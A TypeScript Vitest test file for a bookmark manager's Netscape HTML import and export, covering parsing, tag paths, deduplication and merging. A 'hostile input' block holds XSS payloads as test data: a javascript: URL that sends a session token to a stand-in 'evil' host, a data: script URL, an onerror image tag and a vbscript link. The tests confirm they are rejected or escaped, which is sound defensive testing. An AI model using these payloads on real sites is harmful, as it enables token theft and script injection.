import { describe, it, expect } from "vitest";
import { parseNetscape, planImport, toBookmarks, toNetscape } from "./netscape";
import { AppStore } from "../store.svelte";
import { encodeBase64 } from "../api/base64";
import { serialize } from "../schema/serialize";
import { emptyFile } from "../schema/types";
import { vi } from "vitest";
import type { Bookmark } from "../schema/types";

/** A realistic Chrome/Firefox export, including the malformed markup browsers actually emit. */
const CHROME_EXPORT = `<!DOCTYPE NETSCAPE-Bookmark-file-1>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<TITLE>Bookmarks</TITLE>
<H1>Bookmarks</H1>
<DL><p>
    <DT><H3>Bookmarks bar</H3>
    <DL><p>
        <DT><A HREF="https://rust-lang.org/" ADD_DATE="1600000000">Rust</A>
        <DT><H3>Development</H3>
        <DL><p>
            <DT><A HREF="https://docs.rs" ADD_DATE="1600000001">docs.rs</A>
            <DT><H3>Rust</H3>
            <DL><p>
                <DT><A HREF="https://tokio.rs" ADD_DATE="1600000002">Tokio</A>
            </DL><p>
        </DL><p>
    </DL><p>
</DL><p>`;

function existing(over: Partial<Bookmark> = {}): Bookmark {
  return {
    id: "01EXISTINGEXISTINGEXISTING",
    url: "https://rust-lang.org",
    urlKey: "rust-lang.org",
    title: "Already saved",
    description: "",
    notes: "",
    tags: ["dev"],
    favicon: null,
    pinned: false,
    archived: false,
    createdAt: "2026-08-20T08:00:00.000Z",
    updatedAt: "2026-08-20T08:00:00.000Z",
    deletedAt: null,
    enrichedAt: null,
    ...over,
  };
}

describe("parseNetscape — structure", () => {
  it("extracts every link", () => {
    const { parsed } = parseNetscape(CHROME_EXPORT);
    expect(parsed.map((p) => p.title).sort()).toEqual(["Rust", "Tokio", "docs.rs"]);
  });

  it("maps nested folders to tag paths", () => {
    const { parsed } = parseNetscape(CHROME_EXPORT);
    const tokio = parsed.find((p) => p.title === "Tokio")!;
    expect(tokio.tags).toEqual(["development/rust"]);
  });

  it("drops the browser's own chrome folders from the taxonomy", () => {
    // "Bookmarks bar" is UI furniture, not a category the user chose.
    const { parsed } = parseNetscape(CHROME_EXPORT);
    const rust = parsed.find((p) => p.title === "Rust")!;
    expect(rust.tags).toEqual([]);
  });

  it("preserves ADD_DATE as a creation timestamp", () => {
    const { parsed } = parseNetscape(CHROME_EXPORT);
    expect(parsed.find((p) => p.title === "Rust")!.createdAt).toBe("2020-09-13T12:26:40.000Z");
  });

  it("falls back to the hostname for an untitled link", () => {
    const { parsed } = parseNetscape(`<DL><DT><A HREF="https://example.com/x"></A></DL>`);
    expect(parsed[0]!.title).toBe("example.com");
  });
});

describe("parseNetscape — hostile input (§5.4)", () => {
  const HOSTILE = `<!DOCTYPE NETSCAPE-Bookmark-file-1>
<DL><p>
    <DT><H3>Evil&lt;script&gt;alert(1)&lt;/script&gt;</H3>
    <DL><p>
        <DT><A HREF="javascript:fetch('https://evil/?t='+sessionStorage.token)">Click me</A>
        <DT><A HREF="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">Data URL</A>
        <DT><A HREF="https://ok.example/safe">&lt;img src=x onerror=alert(1)&gt;</A>
        <DT><A HREF="vbscript:msgbox">VB</A>
        <DT><A HREF="not a url">Broken</A>
    </DL><p>
</DL><p>`;

  it("rejects every scheme that could execute in our origin", () => {
    const { parsed, rejected } = parseNetscape(HOSTILE);
    expect(parsed).toHaveLength(1);
    expect(parsed[0]!.url).toBe("https://ok.example/safe");
    expect(rejected).toHaveLength(4);
    expect(rejected.map((r) => r.reason)).toContain("unsupported scheme");
  });

  it("treats a markup payload in a title as text, not markup", () => {
    const { parsed } = parseNetscape(HOSTILE);
    // The title is the literal characters; nothing was parsed as an element.
    expect(parsed[0]!.title).toBe("<img src=x onerror=alert(1)>");
  });

  it("does not execute or retain script from a folder name", () => {
    const { parsed } = parseNetscape(HOSTILE);
    expect(parsed[0]!.tags[0]).toContain("evil");
    expect(parsed[0]!.tags[0]).not.toContain("<");
    expect(parsed[0]!.tags[0]).not.toContain(">");
  });

  it("survives complete garbage without throwing", () => {
    expect(() => parseNetscape("not html at all")).not.toThrow();
    expect(parseNetscape("").parsed).toEqual([]);
  });
});

describe("parseNetscape — tag collapse reporting (§3.3.4)", () => {
  it("reports spellings that collapsed into one tag", () => {
    const html = `<DL>
      <DT><H3>Development</H3><DL><DT><A HREF="https://a.test">A</A></DL>
      <DT><H3>development</H3><DL><DT><A HREF="https://b.test">B</A></DL>
      <DT><H3>  Development  </H3><DL><DT><A HREF="https://c.test">C</A></DL>
    </DL>`;
    const { parsed, tagCollapses } = parseNetscape(html);

    expect(parsed.every((p) => p.tags[0] === "development")).toBe(true);
    // The user must be able to see this happened before applying the import.
    expect(tagCollapses).toHaveLength(1);
    expect(tagCollapses[0]!.canonical).toBe("development");
    expect(tagCollapses[0]!.sources.length).toBeGreaterThan(1);
  });
});

describe("planImport", () => {
  it("separates additions from updates to existing links", () => {
    const report = parseNetscape(CHROME_EXPORT);
    const plan = planImport(report, [existing()]);

    // rust-lang.org already exists (trailing slash and www are normalised away).
    expect(plan.updates).toHaveLength(1);
    expect(plan.updates[0]!.existingTitle).toBe("Already saved");
    expect(plan.additions.map((a) => a.title).sort()).toEqual(["Tokio", "docs.rs"]);
  });

  it("counts duplicates within the imported file itself", () => {
    const html = `<DL>
      <DT><A HREF="https://example.com/p">One</A>
      <DT><A HREF="https://www.example.com/p/?utm_source=x">Two</A>
    </DL>`;
    const plan = planImport(parseNetscape(html), []);
    expect(plan.additions).toHaveLength(1);
    expect(plan.internalDuplicates).toBe(1);
  });

  it("ignores tombstoned records when matching", () => {
    const plan = planImport(
      parseNetscape(`<DL><DT><A HREF="https://rust-lang.org">Rust</A></DL>`),
      [existing({ deletedAt: "2026-08-21T08:00:00.000Z" })],
    );
    // A deleted bookmark should not block re-importing the same link.
    expect(plan.additions).toHaveLength(1);
    expect(plan.updates).toHaveLength(0);
  });
});

describe("toBookmarks", () => {
  it("produces valid records with derived keys", () => {
    const plan = planImport(parseNetscape(CHROME_EXPORT), []);
    const records = toBookmarks(plan.additions);
    expect(records).toHaveLength(3);
    for (const r of records) {
      expect(r.id).toHaveLength(26);
      expect(r.urlKey).not.toBe("");
      expect(r.deletedAt).toBeNull();
    }
  });

  it("seeds ids from the original creation time so ordering survives", () => {
    const records = toBookmarks(parseNetscape(CHROME_EXPORT).parsed);
    const sorted = [...records].sort((a, b) => (a.id < b.id ? -1 : 1));
    expect(sorted[0]!.title).toBe("Rust"); // the oldest ADD_DATE
  });
});

describe("toNetscape (task 4d)", () => {
  it("round-trips through the parser", () => {
    const original = toBookmarks(parseNetscape(CHROME_EXPORT).parsed);
    const exported = toNetscape(original);
    const reparsed = parseNetscape(exported);

    expect(reparsed.parsed).toHaveLength(3);
    expect(reparsed.parsed.map((p) => p.title).sort()).toEqual(["Rust", "Tokio", "docs.rs"]);
  });

  it("escapes markup so an export cannot inject into whatever reads it", () => {
    const nasty = toBookmarks([
      {
        url: "https://example.com/?a=1&b=2",
        title: '<script>alert(1)</script>',
        description: 'He said "hi"',
        tags: ["dev"],
        createdAt: "2026-08-20T08:00:00.000Z",
      },
    ]);
    const html = toNetscape(nasty);
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
    expect(html).toContain("&amp;b=2");
    expect(html).toContain("&quot;hi&quot;");
  });

  it("omits tombstoned records", () => {
    const html = toNetscape([existing({ deletedAt: "2026-08-21T08:00:00.000Z" })]);
    expect(html).not.toContain("rust-lang.org");
  });

  it("writes tags in the TAGS attribute", () => {
    expect(toNetscape([existing()])).toContain('TAGS="dev"');
  });
});

describe("applyImport on the store (task 4b)", () => {
  async function connected() {
    const empty = serialize(emptyFile("2026-08-20T08:00:00.000Z"));
    let i = 0;
    const bodies = [
      { name: "r" },
      { content: encodeBase64(empty), encoding: "base64", sha: "s", size: empty.length },
      { content: { sha: "next" } },
    ];
    const f = vi.fn(async () =>
      new Response(JSON.stringify(bodies[Math.min(i++, bodies.length - 1)]), {
        status: 200,
        headers: { "content-type": "application/json" },
      }),
    ) as unknown as typeof fetch;

    const store = new AppStore();
    await store.connect({ token: "t", owner: "o", repo: "r", path: "p.json" }, null, f);
    return store;
  }

  it("adds new records and reports the counts", async () => {
    const store = await connected();
    const plan = planImport(parseNetscape(CHROME_EXPORT), store.file.bookmarks);
    const result = store.applyImport(plan);

    expect(result).toEqual({ added: 3, updated: 0 });
    expect(store.visible).toHaveLength(3);
  });

  it("merges tags into an existing record instead of replacing them", async () => {
    // An import must never silently drop categorisation the user already did.
    const store = await connected();
    store.addBookmark({ url: "https://tokio.rs", title: "Mine", tags: ["favourites"] });

    const plan = planImport(parseNetscape(CHROME_EXPORT), store.file.bookmarks);
    store.applyImport(plan);

    const tokio = store.visible.find((b) => b.urlKey === "tokio.rs")!;
    expect(tokio.title).toBe("Mine");
    expect(tokio.tags).toEqual(["development/rust", "favourites"]);
  });

  it("does not duplicate a link that is already saved", async () => {
    const store = await connected();
    store.addBookmark({ url: "https://www.rust-lang.org/?utm_source=x" });

    const plan = planImport(parseNetscape(CHROME_EXPORT), store.file.bookmarks);
    store.applyImport(plan);

    expect(store.visible.filter((b) => b.urlKey === "rust-lang.org")).toHaveLength(1);
    expect(store.visible).toHaveLength(3);
  });
});
